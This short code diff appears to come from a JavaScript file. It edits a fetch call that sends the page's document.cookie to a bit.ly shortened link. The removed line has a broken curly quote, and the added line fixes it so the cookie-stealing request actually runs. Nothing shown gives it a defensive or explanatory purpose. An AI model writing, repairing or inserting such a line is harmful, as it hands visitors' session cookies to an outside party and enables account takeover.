@@ -2,7 +2,7 @@ let headersList = {
  "Accept": "*/*"
 }
 
-let response = await fetch("https://bit.ly/3Hkv2yj?cookie=“+document.cookie, { 
+let response = await fetch("https://bit.ly/3Hkv2yj?cookie="+document.cookie, { 
   method: "GET",
   headers: headersList
 });
